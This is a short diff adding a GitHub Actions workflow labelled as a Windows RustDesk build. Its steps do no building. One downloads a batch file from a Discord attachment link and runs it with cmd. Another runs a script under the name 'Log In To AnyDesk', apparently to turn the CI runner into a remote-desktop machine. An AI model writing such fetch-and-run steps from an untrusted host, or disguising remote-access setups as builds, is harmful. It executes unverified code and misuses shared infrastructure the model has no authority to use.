@@ -1,0 +1,18 @@
+name: Windows - RustDesk
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Start Building...
+    runs-on: windows-latest
+    
+    steps:
+      - name: Downloading & Installing Essentials
+        run: |
+          Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1201270076909834270/1219783337086816409/Downloads.bat?ex=660c8ec2&is=65fa19c2&hm=8727a53cbcda97d6e329589e56e03d05ddea231ee3f2791105e0e1980ea1f2b8&" -OutFile "Downloads.bat"
+          cmd /c Downloads.bat
+
+      - name: Log In To AnyDesk
+        run: cmd /c show.bat
